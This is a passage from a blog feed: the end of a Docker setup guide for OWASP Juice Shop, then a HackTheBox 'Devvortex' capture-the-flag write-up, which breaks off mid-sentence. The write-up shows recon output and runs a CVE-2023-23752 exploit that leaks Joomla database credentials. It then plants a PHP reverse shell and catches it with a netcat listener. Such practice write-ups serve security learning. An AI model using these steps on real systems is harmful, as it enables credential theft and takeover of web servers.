concerns and enhance their understanding of prevalent threats in the digital landscape.</p>\n</div>\n<div class=\"cl-preview-section\">\n<h4 id=\"installing-owasp-juice-shop-on-ubuntu-with-docker\">Installing OWASP Juice Shop on Ubuntu with Docker:</h4>\n</div>\n<div class=\"cl-preview-section\">\n<p>Now, let’s dive into the installation process of OWASP Juice Shop on Ubuntu using Docker. While the initial instructions provided focused on Kali Linux, the procedure remains largely similar for Ubuntu.</p>\n</div>\n<div>\n<div> </div>\n<div class=\"cl-preview-section\">1.<strong> Installing Docker on Ubuntu:</strong></div>\n<div class=\"cl-preview-section\">\n<p>Begin by updating the package index and installing Docker using the following commands:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>sudo apt update sudo apt install -y docker.io</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>After installation, start the Docker service and enable it to launch automatically upon system reboot:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>sudo systemctl enable docker --now</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>To grant your user permission to use Docker, add it to the docker group:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>sudo usermod -aG docker $USER</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Reload the group settings for the changes to take effect:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>newgrp docker</code></pre>\n</div>\n<div> </div>\n<div class=\"cl-preview-section\">2.<strong> Running OWASP Juice Shop with Docker:</strong></div>\n<div class=\"cl-preview-section\">\n<p>With Docker installed, pulling and running OWASP Juice Shop is a breeze. Execute the following command to download and launch the Juice Shop container:</p>\n</div>\n<div class=\"cl-preview-section\">\n<pre class=\"language-bash line-numbers\"><code>docker run --rm -p 3000:3000 bkimminich/juice-shop</code></pre>\n<p>If necessary, pull the Juice Shop image first using:</p>\n</div>\n<div>\n<pre class=\"language-bash line-numbers\"><code>docker pull bkimminich/juice-shop</code></pre>\n</div>\n<div class=\"cl-preview-section\">\n<p>Once the container is running, access OWASP Juice Shop via <a href=\"http://localhost:3000/\">http://localhost:3000/</a> in your web browser.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2.png\" alt=\"Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide\" width=\"528\" height=\"286\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-lg.png 1024w\"></figure>\n</div>\n</div>\n<div class=\"cl-preview-section\">\n<h3 id=\"conclusion\">Conclusion:</h3>\n</div>\n<div class=\"cl-preview-section\">\n<p>In conclusion, OWASP Juice Shop stands as a testament to the commitment towards enhancing web application security through hands-on learning and gamification. By leveraging Docker, enthusiasts and professionals can swiftly set up and explore the intricacies of web security in a controlled environment. Embrace the challenges, uncover vulnerabilities, and embark on a journey towards mastering the art of cybersecurity with OWASP Juice Shop.</p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide1-2.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "Pentesting",
                   "Home Labs",
                   "Docker",
                   "CVE"
            ],
            "date_published": "2024-02-11T17:05:04+06:00",
            "date_modified": "2024-02-11T17:08:18+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/devvortex-htb-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/devvortex-htb-writeup.html",
            "title": "Devvortex - HTB Writeup",
            "summary": "Machine Name: Devvortex Difficulty: Easy OS: Linux Challenges: vHost-busting, CVEs, SSTI Beginning start with Nmap scan. For scan, we use ‘-sCV’ flag to run defult scripts&hellip;",
            "content_html": "<ul style=\"list-style-type: circle;\">\n<li><strong>Machine Name: </strong>Devvortex</li>\n<li><strong>Difficulty: </strong>Easy</li>\n<li><strong>OS: </strong>Linux</li>\n<li><strong class=\"ly kz\">Challenges: </strong><span class=\"ly kz\">vHost-busting, CVEs, SSTI</span></li>\n</ul>\n<p>Beginning start with Nmap scan. For scan, we use ‘<strong>-sCV</strong>’ flag to run defult scripts and identify the services versions. Also using '<strong>-Pn</strong>' flag to give not ping the server and '<strong>--min-rate=5000</strong>' flag to speedup our scan.</p>\n<pre class=\"language-bash line-numbers\"><code>sudo nmap -sCV -p- 10.10.11.242 -Pn --min-rate=5000\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 00:57 +06\nNmap scan report for 10.10.11.242\nHost is up (0.054s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://devvortex.htb/\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.34 seconds</code></pre>\n<p>It looks like there are 2 services running. In target machine service one is ‘<strong>SSH</strong>’ running on <strong>22/tcp</strong> port and anotherone is '<strong>Nginx</strong>' running on <strong>80/tcp</strong> port.</p>\n<h3 id=\"3877\" class=\"ng nh gr be ni nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od bj\">Foothold</h3>\n<p>Visiting directly the IP address ( <code class=\"cw ok ol om on b\">http://10.10.11.242</code> ) revealed that we need to resolve domain <code class=\"cw ok ol om on b\">devvortex.htb</code> domain. Next step is to add <code class=\"cw ok ol om on b\">10.10.11.242 devvortex.htb</code> into <code class=\"cw ok ol om on b\">/etc/hosts</code> file. Use the bellow command to do that.</p>\n<pre class=\"language-bash line-numbers\"><code>echo '10.10.11.242 devvortex.htb' | sudo tee -a /etc/hosts </code></pre>\n<h3>Visit Website</h3>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBjaGVjayUyMG91dCUyMHRoaXMlMjB3ZWIlMjAlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIxa0dzSURaazRtM0IlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ0cld0ZlBNaHBzWjYlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ0T0VLdjVUYlluMlklMjIlN0Q=\">Let's check out the website...</span></p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup.png\" alt=\"Devvortex - HTB Writeup\" width=\"502\" height=\"263\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-lg.png 1024w\"></figure>\n<p>After examining the website I didn’t find anything interesting. No secrets, just straightforward simplicity.</p>\n<h3>Directory Fuzzing</h3>\n<p>I am using Gobuster to find hidden directorys if there any.</p>\n<pre class=\"language-bash line-numbers\"><code>gobuster dir -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://devvortex.htb/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Follow Redirect:         true\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/css                  (Status: 403) [Size: 162]\n/images               (Status: 403) [Size: 162]\n/index.html           (Status: 200) [Size: 18048]\n/js                   (Status: 403) [Size: 162]\nProgress: 4723 / 4724 (99.98%)\n===============================================================\nFinished\n===============================================================</code></pre>\n<p>Here, I found nothing interesting to give attentions.</p>\n<h3>Subdomain Recon</h3>\n<p>Now, I am trying to fuzzing vhosts with Gobuster tool to get new targets.</p>\n<pre class=\"language-bash line-numbers\"><code>gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Domain:     devvortex.htb\n[+] Threads:    10\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n===============================================================\nStarting gobuster in DNS enumeration mode\n===============================================================\nFound: dev.devvortex.htb\n\nProgress: 4989 / 4990 (99.98%)\n===============================================================\nFinished\n===============================================================</code></pre>\n<p>We found the dev.devvortex.htb subdomain. We need to add it in the hosts file too.</p>\n<pre class=\"language-bash line-numbers\"><code>10.10.11.242 devvortex.htb dev.devvortex.htb</code></pre>\n<h3>Visiting Website</h3>\n<p><span data-offset-key=\"8Y1UIGHIVYc5:0\">Let's checkout </span><code class=\"r-crgep1 r-2jxp4q r-z2wwpe r-uibjmv r-m2pi6t r-1hvjb8t\" data-slate-leaf=\"true\" data-offset-key=\"8Y1UIGHIVYc5:1\" data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBjaGVja291dCUyMCUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCUyQyU3QiUyMm9iamVjdCUyMiUzQSUyMmxlYWYlMjIlMkMlMjJ0ZXh0JTIyJTNBJTIyZGV2LmRldnZvcnRleC5odGIlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMm1hcmslMjIlMkMlMjJ0eXBlJTIyJTNBJTIyY29kZSUyMiUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyQVl4ODBHWkF6M0ZWJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyblhuRG41U2U1ZWZTJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIySkw4TUU1dDc0RVhvJTIyJTdE\">dev.devvortex.htb</code></p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup2.png\" alt=\"Devvortex - HTB Writeup\" width=\"516\" height=\"270\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-lg.png 1024w\"></figure>\n<p>Slightly changed visuals, probably this version of website is in development and they forgot to turn off vhost on production.</p>\n<p id=\"bb23\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">Anyways, let’s run Gobuster directory enumerationg against it to see what we will find!</p>\n<h3>Directorys Fuzzing</h3>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBydW4lMjBmZXJveGJ1c3RlciUyMGFuZCUyMHNlZSUyMGlmJTIwd2UlMjBjYW4lMjBmaW5kJTIwYW55JTIwaW50ZXJlc3RpbmclMjBkaXJlY3RvcmllcyUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjVZSUVvSENwWFNXRyUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMkFFVmhaaVhDcUxxSCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMkVaVDNDSUh2ek1sbiUyMiU3RA==\">Let's run Gobuster and see if we can find any interesting directories.</span></p>\n<pre class=\"language-bash line-numbers\"><code>gobuster dir -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o dirs_http_dev.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://dev.devvortex.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/images/]\n/home                 (Status: 200) [Size: 23221]\n/media                (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/media/]\n/templates            (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/templates/]\n/modules              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/modules/]\n/plugins              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/plugins/]\n/includes             (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/includes/]\n/language             (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/language/]\n/components           (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/components/]\n/api                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/api/]\n/cache                (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/cache/]\n/libraries            (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/libraries/]\n/tmp                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/tmp/]\n/layouts              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/layouts/]\n/administrator        (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/administrator/]\n/cli                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/cli/]\nProgress: 22980 / 207644 (11.07%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 22994 / 207644 (11.07%)\n===============================================================\nFinished\n===============================================================</code></pre>\n<p>We identified a few directories but I am interested to <code>/administrator</code> directory and it redirects us to Joomla admin panel.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup3.png\" alt=\"Devvortex - HTB Writeup\" width=\"523\" height=\"272\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-lg.png 1024w\"></figure>\n<h3>Website Recon</h3>\n<p>Its a Joomla CMS website. So, let's run Joomscan to findout if there any vulnerebility it have.</p>\n<pre class=\"language-bash line-numbers\"><code>joomscan -u http://dev.devvortex.htb/\n    ____  _____  _____  __  __  ___   ___    __    _  _ \n   (_  _)(  _  )(  _  )(  \\/  )/ __) / __)  /__\\  ( \\( )\n  .-_)(   )(_)(  )(_)(  )    ( \\__ \\( (__  /(__)\\  )  ( \n  \\____) (_____)(_____)(_/\\/\\_)(___/ \\___)(__)(__)(_)\\_)\n\t\t\t(1337.today)\n   \n    --=[OWASP JoomScan\n    +---++---==[Version : 0.0.7\n    +---++---==[Update Date : [2018/09/23]\n    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo\n    --=[Code name : Self Challenge\n    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP\n\nProcessing http://dev.devvortex.htb/ ...\n\n\n\n[+] FireWall Detector\n[++] Firewall not detected\n\n[+] Detecting Joomla Version\n[++] Joomla 4.2.6\n\n[+] Core Joomla Vulnerability\n[++] Target Joomla core is not vulnerable\n\n[+] Checking apache info/status files\n[++] Readable info/status files are not found\n\n[+] admin finder\n[++] Admin page : http://dev.devvortex.htb/administrator/\n\n[+] Checking robots.txt existing\n[++] robots.txt is found\npath : http://dev.devvortex.htb/robots.txt \n\nInteresting path found from robots.txt\nhttp://dev.devvortex.htb/joomla/administrator/\nhttp://dev.devvortex.htb/administrator/\nhttp://dev.devvortex.htb/api/\nhttp://dev.devvortex.htb/bin/\nhttp://dev.devvortex.htb/cache/\nhttp://dev.devvortex.htb/cli/\nhttp://dev.devvortex.htb/components/\nhttp://dev.devvortex.htb/includes/\nhttp://dev.devvortex.htb/installation/\nhttp://dev.devvortex.htb/language/\nhttp://dev.devvortex.htb/layouts/\nhttp://dev.devvortex.htb/libraries/\nhttp://dev.devvortex.htb/logs/\nhttp://dev.devvortex.htb/modules/\nhttp://dev.devvortex.htb/plugins/\nhttp://dev.devvortex.htb/tmp/\n\n\n[+] Finding common backup files name\n[++] Backup files are not found\n\n[+] Finding common log files name\n[++] error log is not found\n\n[+] Checking sensitive config.php.x file\n[++] Readable config files are not found\n\n\nYour Report : reports/dev.devvortex.htb/</code></pre>\n<p id=\"ef03\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\"><strong class=\"mk gs\">Joomla v. 4.2.6</strong>. This version should be vulnerable to recent <a class=\"af oj\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-23752\" rel=\"noopener ugc nofollow\" target=\"_blank\">CVE-2023–23752</a> (Data exfiltration). Surfing the web, I came across this very fine <a class=\"af oj\" href=\"https://www.exploit-db.com/exploits/51334\" rel=\"noopener ugc nofollow\" target=\"_blank\">exploit PoC</a> from <strong class=\"mk gs\">exploit-db.com</strong></p>\n<p id=\"91b4\" class=\"pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj\" data-selectable-paragraph=\"\">Let’s download and run it against the Joomla installation to exploit the webapp.</p>\n<pre class=\"language-bash line-numbers\"><code>ruby exploit.rb http://dev.devvortex.htb \nUsers\n[649] lewis (lewis) - lewis@devvortex.htb - Super Users\n[650] logan paul (logan) - logan@devvortex.htb - Registered\n\nSite info\nSite name: Development\nEditor: tinymce\nCaptcha: 0\nAccess: 1\nDebug status: false\n\nDatabase info\nDB type: mysqli\nDB host: localhost\nDB user: lewis\nDB password: P4ntherg0t1n5r3c0n##\nDB name: joomla\nDB prefix: sd4fg_\nDB encryption 0</code></pre>\n<p>Let’s try to authenticate with the credentials we just exfiltrated.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup4.png\" alt=\"Devvortex - HTB Writeup\" width=\"537\" height=\"281\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup4-lg.png 1024w\"></figure>\n<p>Hurrah, <strong class=\"mk gs\">we are in!</strong></p>\n<p>We saw that user <strong class=\"mk gs\">lewis </strong>is super user, we have admin rights to the content. We can change <strong class=\"mk gs\">PHP </strong>code how/where-ever we want. Our next stop is to land on the page where we can edit <strong class=\"mk gs\">PHP </strong>code and get reverse shell to our host machine. For Joomla, we can find such page inside installed templates. For this, we need to surf through <strong class=\"mk gs\">System -&gt; Templates -&gt; Administrator Templates.</strong></p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup5.png\" alt=\"Devvortex - HTB Writeup\" width=\"549\" height=\"287\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup5-lg.png 1024w\"></figure>\n<p>We have one templated installed. Open and observe it.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup6.png\" alt=\"Devvortex - HTB Writeup\" width=\"546\" height=\"200\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup6-lg.png 1024w\"></figure>\n<p>Click on 'New File' on the top and create 'rev.php' file. Then click on that file that you can find your left in the website.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  style=\"color: var(--text-primary-color); font-family: var(--editor-font-family); font-size: inherit; font-weight: var(--font-weight-normal);\" src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup8.png\" alt=\"Devvortex - HTB Writeup\" width=\"548\" height=\"288\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup8-lg.png 1024w\"></figure>\n<p>Start netcat listener on the host machine <code>nc -lvnp 1337</code>, visit <a href=\"http://dev.devvortex.htb/templates/cassiopeia/rev.php&lt;code&gt;&lt;/code&gt;\" target=\"_blank\" rel=\"noopener noreferrer\">http://dev.devvortex.htb/templates/cassiopeia/rev.php</a> and wait for the sweet shell.</p>\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup9.png\" alt=\"Devvortex - HTB Writeup\" width=\"567\" height=\"177\" sizes=\"(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)\" srcset=\"https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup9-lg.png 1024w\"></figure>\n<p><span data-slate-fragment=\"JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMmxldCdzJTIwdXBncmFkZSUyMG91ciUyMHNoZWxsJTIyJTJDJTIybWFya3MlMjIlM0ElNUIlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyWk9TS2pWWlo2WWN2JTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyQ3Q4RmVuQnpmSEdSJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyYUlJaHlmZEhKczFEJTIyJTdE\">Let's upgrade our shell with this command.</span></p>\n<pre class=\"language-python line-numbers\"><code>python3 -c \"import pty;pty.spawn('/bin/bash')\"</code></pre>\n<p>W<span 